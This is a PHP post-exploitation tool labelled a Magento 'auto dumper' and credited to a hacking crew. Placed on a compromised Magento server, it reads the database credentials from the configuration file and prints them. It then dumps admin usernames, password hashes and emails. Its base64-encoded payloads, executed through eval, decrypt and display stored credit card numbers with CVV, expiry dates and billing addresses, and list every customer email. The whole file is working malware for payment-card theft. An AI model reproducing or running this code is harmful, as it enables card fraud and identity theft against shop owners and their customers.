<?php 

#===================================================================#
#           MAGENTO CMS AUTO DUMPER BY SYNCHRONIZER 
#                RECODED BY rain | Res7ock crew    #  
#           WWW.PRINGSEWUDEV.ORG | WWW.PRINGSEWUCYBER.ORG              #
#                 http://facebook.com/annamLRW                      #
#===================================================================#
?>
<style type="text/css">
body {
    background:black;
    color: lime;
}
table {
    border-collapse: collapse;
    background-color: black 
}

th, td {
    text-align: center;
    padding: 6px;
}
table, th, td {
    border: 1px solid green;
}
tr:nth-child(even){background-color: black }

th {
    border: 1px solid green;
    background-color: #333;
    color: gold;
}
</style>
<?php 
echo '<font color=lime>'.php_uname().'</font>'; 
$adm = '
       mysql_select_db($connection->dbname);
       echo "HOST : <font color=gold>".$connection->host ."</font><font color=gold> | </font>USERNAME : <font color=gold>".$connection->username."</font><font color=gold> | </font>PASSWORD : <font color=gold>".$connection->password."</font><font color=gold> | </font>DB_NAME : <font color=gold>".$connection->dbname."</font></p>";
       $result = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM `".$prefix."admin_user` where is_active = 1");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo "<tr><td >".$row["user_id"]."</td>
               <td >".$row["username"]."</td>
               <td >".$row["password"]."</td>
               <td >".$row["email"]."</td>
               <td >".$row["firstname"]."</td>
               <td >".$row["lastname"]."</td></tr>";
               
           }
           mysql_free_result($result);
       }
       ';

$ccpay = 'ICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUIGNvdW50KCopIEZST00gYCIuJHByZWZpeC4ic2FsZXNfZmxhdF9vcmRlcl9wYXltZW50YCB3aGVyZSANCg0KY2NfbnVtYmVyX2VuYyAhPScnIik7DQogICAgICAgaWYoJHJlc3VsdCAhPT0gRkFMU0UpIHsNCiAgICAgICAgICAgJGNvdW50ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCwgTVlTUUxfTlVNKTsNCiAgICAgICAgICAgbXlzcWxfZnJlZV9yZXN1bHQoJHJlc3VsdCk7DQogICAgICAgICAgIGlmKCRjb3VudCAmJiAkY291bnRbMF0pew0KICAgICAgICAgICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgDQoNCnNmby5jY19vd25lcixzZm8uY2NfbnVtYmVyX2VuYyxzZm8uY2Nfc2VjdXJlX3ZlcmlmeSxDT05DQVQoc2ZvLmNjX2V4cF9tb250aCwnfCcsc2ZvLmNjX2V4cF95ZWFyKSBhcyANCg0KZXhwLENPTkNBVChiaWxsaW5nLmZpcnN0bmFtZSwnfCcsYmlsbGluZy5sYXN0bmFtZSwnfCcsYmlsbGluZy5zdHJlZXQsJ3wnLGJpbGxpbmcuY2l0eSwnfCcsIA0KDQpiaWxsaW5nLnJlZ2lvbiwnfCcsYmlsbGluZy5wb3N0Y29kZSwnfCcsYmlsbGluZy5jb3VudHJ5X2lkLCd8JyxiaWxsaW5nLnRlbGVwaG9uZSwnfCcsYmlsbGluZy5lbWFpbCkgDQoNCkFTICdCaWxsaW5nIEFkZHJlc3MnIEZST00gIi4kcHJlZml4LiJzYWxlc19mbGF0X29yZGVyX3BheW1lbnQgQVMgc2ZvIEpPSU4gIi4NCg0KJHByZWZpeC4ic2FsZXNfZmxhdF9vcmRlcl9hZGRyZXNzIEFTIGJpbGxpbmcgT04gYmlsbGluZy5wYXJlbnRfaWQgPSBzZm8ucGFyZW50X2lkIEFORCANCg0KYmlsbGluZy5hZGRyZXNzX3R5cGUgPSAnYmlsbGluZycgd2hlcmUgY2NfbnVtYmVyX2VuYyAhPSAnJyIpOw0KICAgICAgICAgICAgICAgaWYoISRyZXN1bHQpIHsNCiAgICAgICAgICAgICAgICAgICBwcmludCgiPGI+RXJyb3Igc3FsOjwvYj4iLm15c3FsX2Vycm9yKCkuIjxici8+XG4iKTsgDQogICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCwgTVlTUUxfQVNTT0MpKSB7DQogICAgICAgICAgICAgICAgICBlY2hvICINCgkJCSAgIDx0cj48dGQgPiIuJHJvd1snY2Nfb3duZXInXS4iPC90ZD4NCgkJCSAgIDx0ZCA+Ii5NYWdlOjpoZWxwZXIoJ2NvcmUnKS0+ZGVjcnlwdCgkcm93WydjY19udW1iZXJfZW5jJ10pLiI8L3RkPg0KCQkJICAgPHRkID4iLiRyb3dbJ2V4cCddLiI8L3RkPg0KCQkJICAgPHRkID4iLiRyb3dbJ0JpbGxpbmcgQWRkcmVzcyddLiI8L3RkPg0KPHRkID4iLiRyb3dbJ2NjX3NlY3VyZV92ZXJpZnknXS4iPC90ZD48L3RyID4iOw0KICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgbXlzcWxfZnJlZV9yZXN1bHQoJHJlc3VsdCk7DQogICAgICAgICAgIH0NCiAgICAgICB9';
$maildump = "ICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUIGVtYWlsIEZST00gICIuJHByZWZpeC4iY3VzdG9tZXJfZW50aXR5Iik7DQogICAgICAgaWYoJHJlc3VsdCAhPT0gRkFMU0UpIHsNCiAgICAgICAgICAgd2hpbGUoJHJvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQsIE1ZU1FMX0FTU09DKSkgew0KICAgICAgICAgICAgICAgZWNobyAiDQoJCQkgICA8dHI+DQoJCQkgICA8dGQgPiIuJHJvd1siZW1haWwiXS4iPC90ZD48L3RyPg0KCQkJICAgIjsNCiAgICAgICAgICAgfQ0KICAgICAgICAgICBteXNxbF9mcmVlX3Jlc3VsdCgkcmVzdWx0KTsNCiAgICAgICB9";
?>
<?php

error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);

function print_data($data){
if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')) {
   $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
   if(isset($xml->global->resources->default_setup->connection)) {
       $connection = $xml->global->resources->default_setup->connection;
       $prefix = $xml->global->resources->db->table_prefix;
      
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
       
       try {
           $app = Mage::app('default');
           Mage::getSingleton('core/session', array('name'=>'frontend'));
       }catch(Exception $e) {
       }

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){
           print("Could not connect: " . mysql_error());
       }
       eval($data);
}
}
}
?>

<center>
<table style="text-align:center" width=90% class="tg">
  <tr>
    <th >ID</th>
    <th >USER_NAME</th>
    <th >PASSWORD</th>
    <th >EMAIL</th>
    <th >FIRST_NAME</th>
    <th >LAST_NAME</th>
  </tr>
<?php 
echo print_data($adm);
?>
</table></p>
<table style="text-align:center" width=90% class="tg">
  <tr>
    <th >CC_OWNER</th>
    <th >CC_NUMBER</th>
    <th >EXPIRED DATE</th>
    <th >BILLING ADDRESS</th> 
    <th >cvv</th>
  </tr>
<?php 
echo print_data(base64_decode($ccpay));
?>
</table>
</p>
<table style="text-align:center" width=90% class="tg">
  <tr>
    <th >E-MAIL ADDRESS</th>
  </tr>
<?php 
echo print_data(base64_decode($maildump));
?>
</table>
